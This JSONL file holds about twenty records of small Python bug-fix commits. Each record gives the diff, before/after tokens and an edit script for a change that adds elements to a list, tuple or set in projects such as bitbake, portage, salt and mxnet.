{"project": "mxnet", "commit_sha": "83ecf2da4bf9691589d9818ad662c5eae09601c5", "parent_sha": "f15b1b88b9f055420ba19bb73e93b229bf03febd", "file_path": "example/image-classification/common/fit.py", "project_url": "https://github.com/zhiiker/mxnet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -216,7 +216,7 @@ def fit(args, network, data_loader, **kwargs):\n         'multi_precision': True}\n \n     # Only a limited number of optimizers have 'momentum' property\n-    has_momentum = {'sgd', 'dcasgd', 'nag'}\n+    has_momentum = {'sgd', 'dcasgd', 'nag', 'signum', 'lbsgd'}\n     if args.optimizer in has_momentum:\n         optimizer_params['momentum'] = args.mom\n \n", "before": "has_momentum = { 'sgd' , 'dcasgd' , 'nag' }", "after": "has_momentum = { 'sgd' , 'dcasgd' , 'nag' , 'signum' , 'lbsgd' }", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"set\", 3, 20, 3, 44], [\",:,\", \"T\"], 6], [\"Insert\", [\"set\", 3, 20, 3, 44], [\"string:'signum'\", \"T\"], 7], [\"Insert\", [\"set\", 3, 20, 3, 44], [\",:,\", \"T\"], 8], [\"Insert\", [\"set\", 3, 20, 3, 44], [\"string:'lbsgd'\", \"T\"], 9]]"}
{"project": "ansible-1", "commit_sha": "b0fe70538406334f21708401558e4e2e4292658f", "parent_sha": "45355cd5660da17350811d92a5144077910ea434", "file_path": "lib/ansible/inventory/script.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ class InventoryScript:\n             if not isinstance(data, dict):\n                 data = {'hosts': data}\n             # is not those subkeys, then simplified syntax, host with vars\n-            elif not any(k in data for k in ('hosts','vars')):\n+            elif not any(k in data for k in ('hosts','vars','children')):\n                 data = {'hosts': [group_name], 'vars': data}\n \n             if 'hosts' in data:\n", "before": "if not isinstance ( data , dict ) : data = { 'hosts' : data } elif not any ( k in data for k in ( 'hosts' , 'vars' ) ) : data = { 'hosts' : [ group_name ] , 'vars' : data }", "after": "if not isinstance ( data , dict ) : data = { 'hosts' : data } elif not any ( k in data for k in ( 'hosts' , 'vars' , 'children' ) ) : data = { 'hosts' : [ group_name ] , 'vars' : data }", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 45, 3, 61], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 45, 3, 61], [\"string:'children'\", \"T\"], 5]]"}
{"project": "bitbake", "commit_sha": "9bff182a4ba9571679985b45b309990a6eddad14", "parent_sha": "c1d978d7bd1ac8eb1e2d50029ab2384be9f72fb4", "file_path": "lib/bb/codeparser.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ def parser_cache_save(d):\n         try:\n             p = pickle.Unpickler(file(cachefile, \"rb\"))\n             data, version = p.load()\n-        except (IOError, EOFError):\n+        except (IOError, EOFError, ValueError):\n             data, version = None, None\n \n         if version != PARSERCACHE_VERSION:\n", "before": "try : p = pickle . Unpickler ( file ( cachefile , \"rb\" ) ) data , version = p . load ( ) except ( IOError , EOFError ) : data , version = None , None", "after": "try : p = pickle . Unpickler ( file ( cachefile , \"rb\" ) ) data , version = p . load ( ) except ( IOError , EOFError , ValueError ) : data , version = None , None", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 16, 3, 35], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 16, 3, 35], [\"identifier:ValueError\", \"T\"], 5]]"}
{"project": "bitbake", "commit_sha": "294bb9cad294423d4f8998405ceff58655f12660", "parent_sha": "24a28205ab680b6cc645d97b76c9855920608229", "file_path": "lib/bb/cooker.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1355,7 +1355,7 @@ class BBCooker:\n         if self.state == state.running:\n             return\n \n-        if self.state in (state.shutdown, state.forceshutdown):\n+        if self.state in (state.shutdown, state.forceshutdown, state.error):\n             if hasattr(self.parser, 'shutdown'):\n                 self.parser.shutdown(clean=False, force = True)\n             raise bb.BBHandledException()\n", "before": "if self . state in ( state . shutdown , state . forceshutdown ) : if hasattr ( self . parser , 'shutdown' ) : self . parser . shutdown ( clean = False , force = True ) raise bb . BBHandledException ( )", "after": "if self . state in ( state . shutdown , state . forceshutdown , state . error ) : if hasattr ( self . parser , 'shutdown' ) : self . parser . shutdown ( clean = False , force = True ) raise bb . BBHandledException ( )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 26, 3, 63], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 26, 3, 63], [\"attribute\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:state\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:error\", \"T\"], 2]]"}
{"project": "conda-build", "commit_sha": "f0b4102011254512425386ce2ca4a438329e6c77", "parent_sha": "daaf7374088c9bd4bc16ba1b4cf1b0e758cc3222", "file_path": "tests/test_api_consistency.py", "project_url": "https://github.com/bgruening/conda-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -118,5 +118,5 @@ def test_api_create_metapackage():\n \n def test_api_update_index():\n     argspec = getargspec(api.update_index)\n-    assert argspec.args == ['dir_paths', 'config', 'force', 'check_md5', 'remove']\n+    assert argspec.args == ['dir_paths', 'config', 'force', 'check_md5', 'remove', 'channel_name']\n     assert argspec.defaults == (None, False, False, False)\n", "before": "assert argspec . args == [ 'dir_paths' , 'config' , 'force' , 'check_md5' , 'remove' ]", "after": "assert argspec . args == [ 'dir_paths' , 'config' , 'force' , 'check_md5' , 'remove' , 'channel_name' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 28, 3, 83], [\",:,\", \"T\"], 10], [\"Insert\", [\"list\", 3, 28, 3, 83], [\"string:'channel_name'\", \"T\"], 11]]"}
{"project": "bitbake", "commit_sha": "35784582fdbb2092eddec094deb6ab9c87666b5e", "parent_sha": "9dc5178f56ab8ae37e1a646c09117c503e48d072", "file_path": "lib/bb/tests/runqueue.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -255,7 +255,7 @@ class RunQueueTests(unittest.TestCase):\n             cmd = [\"bitbake\", \"a1\", \"b1\"]\n             tasks = self.run_bitbakecmd(cmd, tempdir, sstatevalid, extraenv=extraenv, cleanup=True)\n             expected = ['a1:populate_sysroot', 'a1:package', 'a1:package_write_rpm_setscene', 'a1:packagedata_setscene',\n-                        'a1:package_write_ipk_setscene', 'a1:package_qa_setscene']\n+                        'a1:package_write_ipk_setscene', 'a1:package_qa_setscene', 'a1:build']\n             self.assertEqual(set(tasks), set(expected))\n \n             self.shutdown(tempdir)\n", "before": "expected = [ 'a1:populate_sysroot' , 'a1:package' , 'a1:package_write_rpm_setscene' , 'a1:packagedata_setscene' , 'a1:package_write_ipk_setscene' , 'a1:package_qa_setscene' ]", "after": "expected = [ 'a1:populate_sysroot' , 'a1:package' , 'a1:package_write_rpm_setscene' , 'a1:packagedata_setscene' , 'a1:package_write_ipk_setscene' , 'a1:package_qa_setscene' , 'a1:build' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 2, 46, 2, 47], [\"list\", 2, 24, 3, 83], 11], [\"Insert\", [\"list\", 2, 24, 3, 83], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 2, 24, 3, 83], [\"string:'a1:build'\", \"T\"], 4]]"}
{"project": "bitbake", "commit_sha": "2cd2d0a48e12ab4358fb967eaf7a56c17993f48d", "parent_sha": "6459c1d0eb8f1007246df36149e2496ee531e25f", "file_path": "lib/bb/fetch2/__init__.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1157,7 +1157,7 @@ class FetchMethod(object):\n                      (file, urldata.parm.get('unpack')))\n \n         dots = file.split(\".\")\n-        if dots[-1] in ['gz', 'bz2', 'Z']:\n+        if dots[-1] in ['gz', 'bz2', 'Z', 'xz']:\n             efile = os.path.join(rootdir, os.path.basename('.'.join(dots[0:-1])))\n         else:\n             efile = file\n", "before": "if dots [ - 1 ] in [ 'gz' , 'bz2' , 'Z' ] : efile = os . path . join ( rootdir , os . path . basename ( '.' . join ( dots [ 0 : - 1 ] ) ) ) else : efile = file", "after": "if dots [ - 1 ] in [ 'gz' , 'bz2' , 'Z' , 'xz' ] : efile = os . path . join ( rootdir , os . path . basename ( '.' . join ( dots [ 0 : - 1 ] ) ) ) else : efile = file", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 24, 3, 42], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 24, 3, 42], [\"string:'xz'\", \"T\"], 7]]"}
{"project": "ScoutSuite", "commit_sha": "3deead71b7ce94ae39df841a3f59394d0bf098f5", "parent_sha": "31c27089d775f065df82435fcb5c56920fab8f16", "file_path": "AWSScout2/utils.py", "project_url": "https://github.com/agnivesh/ScoutSuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,4 +69,4 @@ def is_throttled(e):\n-    return True if  (hasattr(e, 'response') and 'Error' in e.response and e.response['Error']['Code'] in [ 'Throttling', 'RequestLimitExceeded' ]) else False\n+    return True if  (hasattr(e, 'response') and 'Error' in e.response and e.response['Error']['Code'] in [ 'Throttling', 'RequestLimitExceeded', 'ThrottlingException' ]) else False\n", "before": "return True if ( hasattr ( e , 'response' ) and 'Error' in e . response and e . response [ 'Error' ] [ 'Code' ] in [ 'Throttling' , 'RequestLimitExceeded' ] ) else False", "after": "return True if ( hasattr ( e , 'response' ) and 'Error' in e . response and e . response [ 'Error' ] [ 'Code' ] in [ 'Throttling' , 'RequestLimitExceeded' , 'ThrottlingException' ] ) else False", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 0, 106, 0, 146], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 0, 106, 0, 146], [\"string:'ThrottlingException'\", \"T\"], 5]]"}
{"project": "casepro", "commit_sha": "9a134b674fdbc2f9d86a4b56085caa755485ef9e", "parent_sha": "736089a19c60eb0dce0d1153f102efeeb969ebff", "file_path": "casepro/orgs_ext/tests.py", "project_url": "https://github.com/Ilhasoft/casepro", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -98,7 +98,7 @@ class OrgExtCRUDLTest(BaseCasesTest):\n             [(self.females.pk, \"Females\"), (self.males.pk, \"Males\"), (self.reporters.pk, \"Reporters\")],\n         )\n         self.assertEqual(form.fields[\"suspend_groups\"].initial, [self.reporters.pk])\n-        self.assertEqual(form.fields[\"followup_flow\"].choices, [('0001-0001', 'Registration'), ('0002-0002', 'Follow-Up')])\n+        self.assertEqual(form.fields[\"followup_flow\"].choices, [('', '----'), ('0001-0001', 'Registration'), ('0002-0002', 'Follow-Up')])\n         self.assertEqual(form.fields[\"followup_flow\"].initial, None)\n \n         # test updating\n", "before": "self . assertEqual ( form . fields [ \"followup_flow\" ] . choices , [ ( '0001-0001' , 'Registration' ) , ( '0002-0002' , 'Follow-Up' ) ] )", "after": "self . assertEqual ( form . fields [ \"followup_flow\" ] . choices , [ ( '' , '----' ) , ( '0001-0001' , 'Registration' ) , ( '0002-0002' , 'Follow-Up' ) ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 64, 3, 123], [\"tuple\", \"N0\"], 1], [\"Insert\", [\"list\", 3, 64, 3, 123], [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"string:''\", \"T\"], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'----'\", \"T\"], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4]]"}
{"project": "vumi-go", "commit_sha": "d5f289d1bbdd336d6da3ed96db36a5fb65aa8c64", "parent_sha": "5937a67f8904596acd436e1070f4c490cdc3ec23", "file_path": "go/apps/wikipedia/tests/test_vumi_app.py", "project_url": "https://github.com/ChrisNolan1992/vumi-go", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ class TestWikipediaApplication(AppWorkerTestCase, FakeHTTPTestCaseMixin):\n         super(TestWikipediaApplication, self).setUp()\n         yield self.start_webserver(WIKIPEDIA_RESPONSES)\n \n-        self.config = self.mk_config({})\n+        self.config = self.mk_config({\"secret_key\": \"s3cr3t\"})\n         self.app = yield self.get_application(self.config)\n \n         # Steal app's vumi_api\n", "before": "self . config = self . mk_config ( { } )", "after": "self . config = self . mk_config ( { \"secret_key\" : \"s3cr3t\" } )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 38, 3, 40], [\"pair\", \"N0\"], 1], [\"Insert\", \"N0\", [\"string:\\\"secret_key\\\"\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:\\\"s3cr3t\\\"\", \"T\"], 2]]"}
{"project": "geonode", "commit_sha": "9b5fe00776940c171d9211d458826d9f96e1135f", "parent_sha": "61769b11741deb3740acfb709bf7ea849e8a01ba", "file_path": "geonode/security/models.py", "project_url": "https://github.com/vidyar/geonode", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -185,7 +185,7 @@ class PermissionLevelMixin(object):\n             for user, perms in perm_spec['users'].items():\n                 user = get_user_model().objects.get(username=user)\n                 for perm in perms:\n-                    if self.polymorphic_ctype.name == 'layer' and perm in ('change_layer_data', 'change_layer_style'):\n+                    if self.polymorphic_ctype.name == 'layer' and perm in ('add_layer', 'change_layer', 'delete_layer', 'change_layer_data', 'change_layer_style'):\n                         assign_perm(perm, user, self.layer)\n                     else:\n                         assign_perm(perm, user, self.get_self_resource())\n", "before": "if self . polymorphic_ctype . name == 'layer' and perm in ( 'change_layer_data' , 'change_layer_style' ) : assign_perm ( perm , user , self . layer ) else : assign_perm ( perm , user , self . get_self_resource ( ) )", "after": "if self . polymorphic_ctype . name == 'layer' and perm in ( 'add_layer' , 'change_layer' , 'delete_layer' , 'change_layer_data' , 'change_layer_style' ) : assign_perm ( perm , user , self . layer ) else : assign_perm ( perm , user , self . get_self_resource ( ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"string:'change_layer_data'\", 3, 76, 3, 95], [\"tuple\", 3, 75, 3, 118], 2], [\"Insert\", [\"tuple\", 3, 75, 3, 118], [\"string:'add_layer'\", \"T\"], 1], [\"Insert\", [\"tuple\", 3, 75, 3, 118], [\",:,\", \"T\"], 2], [\"Insert\", [\"tuple\", 3, 75, 3, 118], [\"string:'change_layer'\", \"T\"], 3], [\"Insert\", [\"tuple\", 3, 75, 3, 118], [\"string:'delete_layer'\", \"T\"], 6], [\"Insert\", [\"tuple\", 3, 75, 3, 118], [\",:,\", \"T\"], 7], [\"Insert\", [\"tuple\", 3, 75, 3, 118], [\",:,\", \"T\"], 5]]"}
{"project": "Theano", "commit_sha": "853a5915398ecdca63283e967b2ca37109704f1f", "parent_sha": "92e42e6c090f8d98394421bf0e209b99910e1af9", "file_path": "tensor_random.py", "project_url": "https://github.com/reference-project/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -133,7 +133,7 @@ class NumpyGenerator(gof.op.Op):\n         return gof.Apply(op = self, inputs = inputs, outputs = outputs)\n \n     def grad(self, inputs, grad_outputs):\n-        return [None]\n+        return [None, None]\n \n     def perform(self, node, input_storage, output_storage):\n         rng = input_storage[0]\n", "before": "return [ None ]", "after": "return [ None , None ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 16, 3, 22], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 3, 16, 3, 22], [\"none:None\", \"T\"], 3]]"}
{"project": "forecast", "commit_sha": "dd3bff0f4cd95a3243800f9507ad815327c1a3bb", "parent_sha": "e07f304696e212baeb18e625183a67ba245e94ec", "file_path": "stock_forecasting_smoothing_techniques/tests/test_forecasting.py", "project_url": "https://github.com/cloud9UG/forecast", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class TestForecasting(common.TransactionCase):\n                     ca=vexpected < vreal and '>' or '<',\n                     diff=vdiff)]\n \n-        error_msg = '\\n'.join([_('Fall forecast calculation ')] + elist)\n+        error_msg = '\\n'.join(['\\n', _('Fall forecast calculation ')] + elist)\n         self.assertTrue(elist == [], error_msg)\n         # self.assertDictEqual(correct, real)\n \n", "before": "diff = vdiff ) ] error_msg = '\\n' . join ( [ _ ( 'Fall forecast calculation ' ) ] + elist )", "after": "diff = vdiff ) ] error_msg = '\\n' . join ( [ '\\n' , _ ( 'Fall forecast calculation ' ) ] + elist )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 31, 3, 64], [\"string:'\\\\n'\", \"T\"], 1], [\"Insert\", [\"list\", 3, 31, 3, 64], [\",:,\", \"T\"], 2]]"}
{"project": "salt", "commit_sha": "edb7606fcf1c5ce4c3e535054744ac62f9d98f3a", "parent_sha": "4ba9314acafa0e947d1708a342dbfbadddc1e167", "file_path": "salt/config.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1990,7 +1990,7 @@ def apply_master_config(overrides=None, defaults=None):\n     # Prepend root_dir to other paths\n     prepend_root_dirs = [\n         'pki_dir', 'cachedir', 'pidfile', 'sock_dir', 'extension_modules',\n-        'autosign_file', 'autoreject_file', 'token_dir'\n+        'autosign_file', 'autoreject_file', 'token_dir', 'sqlite_queue_dir'\n     ]\n \n     # These can be set to syslog, so, not actual paths on the system\n", "before": "prepend_root_dirs = [ 'pki_dir' , 'cachedir' , 'pidfile' , 'sock_dir' , 'extension_modules' , 'autosign_file' , 'autoreject_file' , 'token_dir' ]", "after": "prepend_root_dirs = [ 'pki_dir' , 'cachedir' , 'pidfile' , 'sock_dir' , 'extension_modules' , 'autosign_file' , 'autoreject_file' , 'token_dir' , 'sqlite_queue_dir' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 2, 18, 2, 19], [\"list\", 1, 25, 4, 6], 11], [\"Insert\", [\"list\", 1, 25, 4, 6], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 1, 25, 4, 6], [\",:,\", \"T\"], 17], [\"Insert\", [\"list\", 1, 25, 4, 6], [\"string:'sqlite_queue_dir'\", \"T\"], 18], [\"Delete\", [\",:,\", 3, 24, 3, 25]]]"}
{"project": "customizer", "commit_sha": "b717fa73a997d15c1dc7f7ec95bea219691cf548", "parent_sha": "c2be86789c03c2e0a3c29c9695238fc7796e9ed5", "file_path": "src/lib/misc.py", "project_url": "https://github.com/jotebe/customizer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ def list_files(directory):\n     return slist\n \n def chroot_exec(command, prepare=True, mount=True, output=False, xnest=False):\n-    pseudofs = ['/proc', '/dev', '/sys']\n+    pseudofs = ['/proc', '/dev', '/sys', '/tmp']\n     if xnest:\n         if os.path.islink(config.FILESYSTEM_DIR + '/var/run'):\n             pseudofs.append('/run/dbus')\n", "before": "pseudofs = [ '/proc' , '/dev' , '/sys' ]", "after": "pseudofs = [ '/proc' , '/dev' , '/sys' , '/tmp' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 16, 3, 41], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 16, 3, 41], [\"string:'/tmp'\", \"T\"], 7]]"}
{"project": "idiomatic-python-kata", "commit_sha": "f9e1c3d9c70a86600dd6e22684bdd1e0da563665", "parent_sha": "680e4569dae0ba09e7624c063d7b52f4ccfc1f12", "file_path": "tests/test_board.py", "project_url": "https://github.com/gardenunez/idiomatic-python-kata", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ class TestBoard(TestCase):\n         board.add_tags('TAG')\n         board.add_tags('')\n         board.add_tags(None)\n-        assert board.tags == []\n+        assert board.tags == ['TAG']\n \n     def test_columns(self):\n         board1 = Board(title=TITLE, columns=['ToDo', 'Done'])\n", "before": "assert board . tags == [ ]", "after": "assert board . tags == [ 'TAG' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 30, 3, 32], [\"string:'TAG'\", \"T\"], 1]]"}
{"project": "pyinstaller", "commit_sha": "79292197952e3fca060d13761b66c9b1663f122a", "parent_sha": "24e174049a747f66978d66de1cc031a3b59cf284", "file_path": "PyInstaller/depend/analysis.py", "project_url": "https://github.com/StarfishStorage/pyinstaller", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -207,7 +207,7 @@ class PyiModuleGraph(ModuleGraph):\n         # Find runtime hooks that are implied by packages already imported.\n         # Get a temporary TOC listing all the scripts and packages graphed\n         # so far. Assuming that runtime hooks apply only to modules and packages.\n-        temp_toc = self.make_a_TOC(['PYMODULE','PYSOURCE'])\n+        temp_toc = self.make_a_TOC(['EXTENSION', 'PYMODULE', 'PYSOURCE'])\n         for (mod_name, path, typecode) in temp_toc:\n             # Look if there is any run-time hook for given module.\n             if mod_name in self._available_rthooks:\n", "before": "temp_toc = self . make_a_TOC ( [ 'PYMODULE' , 'PYSOURCE' ] )", "after": "temp_toc = self . make_a_TOC ( [ 'EXTENSION' , 'PYMODULE' , 'PYSOURCE' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"string:'PYMODULE'\", 3, 37, 3, 47], [\"list\", 3, 36, 3, 59], 2], [\"Insert\", [\"list\", 3, 36, 3, 59], [\"string:'EXTENSION'\", \"T\"], 1], [\"Insert\", [\"list\", 3, 36, 3, 59], [\",:,\", \"T\"], 3]]"}
{"project": "Qcodes", "commit_sha": "0fd20b18426c272d61bf52a88e47360d48573cac", "parent_sha": "d5db617ae1e74924a206780c6cc84362cf51b38f", "file_path": "qcodes/utils/installation_info.py", "project_url": "https://github.com/jenshnielsen/Qcodes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ def is_qcodes_installed_editably() -> Optional[bool]:\n     answer: Optional[bool]\n \n     try:\n-        pipproc = subprocess.run(['pip', 'list', '-e', '--no-index',\n+        pipproc = subprocess.run(['python' '-m', 'pip', 'list', '-e', '--no-index',\n                                   '--format=json'],\n                                  check=True,\n                                  stdout=subprocess.PIPE)\n", "before": "pipproc = subprocess . run ( [ 'pip' , 'list' , '-e' , '--no-index' , '--format=json' ] , check = True , stdout = subprocess . PIPE )", "after": "pipproc = subprocess . run ( [ 'python' '-m' , 'pip' , 'list' , '-e' , '--no-index' , '--format=json' ] , check = True , stdout = subprocess . PIPE )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 3, 48, 3, 49], [\"list\", 3, 34, 4, 51], 1], [\"Move\", [\",:,\", 3, 54, 3, 55], [\"list\", 3, 34, 4, 51], 2], [\"Move\", [\"string:'--no-index'\", 3, 56, 3, 68], [\"list\", 3, 34, 4, 51], 8], [\"Insert\", [\"list\", 3, 34, 4, 51], [\"concatenated_string\", \"N0\"], 1], [\"Insert\", [\"list\", 3, 34, 4, 51], [\",:,\", \"T\"], 5], [\"Insert\", [\"list\", 3, 34, 4, 51], [\",:,\", \"T\"], 10], [\"Insert\", \"N0\", [\"string:'python'\", \"T\"], 0], [\"Insert\", \"N0\", [\"string:'-m'\", \"T\"], 1], [\"Delete\", [\",:,\", 3, 40, 3, 41]]]"}
{"project": "portage", "commit_sha": "650c960be3170bade8bb63ddedcd4796c75ec374", "parent_sha": "f75fed63cb0256505d684ce524d65c9086af0879", "file_path": "pym/_emerge/FakeVartree.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ class FakeVartree(vartree):\n \t\t\tself.dbapi.aux_get = self._aux_get_wrapper\n \t\t\tself.dbapi.match = self._match_wrapper\n \t\tself._aux_get_history = set()\n-\t\tself._portdb_keys = [\"EAPI\", \"DEPEND\", \"RDEPEND\", \"PDEPEND\"]\n+\t\tself._portdb_keys = [\"EAPI\", \"KEYWORDS\", \"DEPEND\", \"RDEPEND\", \"PDEPEND\"]\n \t\tself._portdb = portdb\n \t\tself._global_updates = None\n \n", "before": "self . _portdb_keys = [ \"EAPI\" , \"DEPEND\" , \"RDEPEND\" , \"PDEPEND\" ]", "after": "self . _portdb_keys = [ \"EAPI\" , \"KEYWORDS\" , \"DEPEND\" , \"RDEPEND\" , \"PDEPEND\" ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"string:\\\"DEPEND\\\"\", 3, 32, 3, 40], [\"list\", 3, 23, 3, 63], 4], [\"Move\", [\"string:\\\"RDEPEND\\\"\", 3, 42, 3, 51], [\"list\", 3, 23, 3, 63], 7], [\"Insert\", [\"list\", 3, 23, 3, 63], [\"string:\\\"KEYWORDS\\\"\", \"T\"], 3], [\"Insert\", [\"list\", 3, 23, 3, 63], [\",:,\", \"T\"], 7]]"}
{"project": "portage", "commit_sha": "a6e24656c2fa2ac41265bcc4871726a2b6ccc567", "parent_sha": "1d73d80236e380f26f32f1737cc2f36d980715d1", "file_path": "pym/portage/update.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -194,7 +194,7 @@ def update_config_files(config_root, protect, protect_mask, update_iter):\n \tupdate_files = {}\n \tfile_contents = {}\n \tmyxfiles = [\"package.mask\", \"package.unmask\", \\\n-\t\t\"package.keywords\", \"package.use\"]\n+\t\t\"package.keywords\", \"package.license\", \"package.use\"]\n \tmyxfiles += [os.path.join(\"profile\", x) for x in myxfiles]\n \tabs_user_config = os.path.join(config_root, USER_CONFIG_PATH)\n \trecursivefiles = []\n", "before": "myxfiles = [ \"package.mask\" , \"package.unmask\" , \"package.keywords\" , \"package.use\" ]", "after": "myxfiles = [ \"package.mask\" , \"package.unmask\" , \"package.keywords\" , \"package.license\" , \"package.use\" ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 2, 28, 2, 29], [\"list\", 2, 13, 3, 37], 5], [\"Insert\", [\"list\", 2, 13, 3, 37], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 2, 13, 3, 37], [\"string:\\\"package.license\\\"\", \"T\"], 4], [\"Insert\", [\"list\", 2, 13, 3, 37], [\",:,\", \"T\"], 5], [\"Delete\", [\",:,\", 3, 21, 3, 22]]]"}
{"project": "portage", "commit_sha": "2019a225ad017927ac333a047947fd6897edd256", "parent_sha": "d6b008760c6e04bd3640e71ae1f3e599947cfbec", "file_path": "pym/portage/package/ebuild/doebuild.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -134,7 +134,7 @@ def _doebuild_path(settings, eapi=None):\n \n \tpath = []\n \n-\tif eapi not in (None, \"0\", \"1\", \"2\"):\n+\tif eapi not in (None, \"0\", \"1\", \"2\", \"3\"):\n \t\tpath.append(os.path.join(portage_bin_path, \"ebuild-helpers\", \"4\"))\n \n \tpath.append(os.path.join(portage_bin_path, \"ebuild-helpers\"))\n", "before": "if eapi not in ( None , \"0\" , \"1\" , \"2\" ) : path . append ( os . path . join ( portage_bin_path , \"ebuild-helpers\" , \"4\" ) )", "after": "if eapi not in ( None , \"0\" , \"1\" , \"2\" , \"3\" ) : path . append ( os . path . join ( portage_bin_path , \"ebuild-helpers\" , \"4\" ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 17, 3, 38], [\",:,\", \"T\"], 8], [\"Insert\", [\"tuple\", 3, 17, 3, 38], [\"string:\\\"3\\\"\", \"T\"], 9]]"}
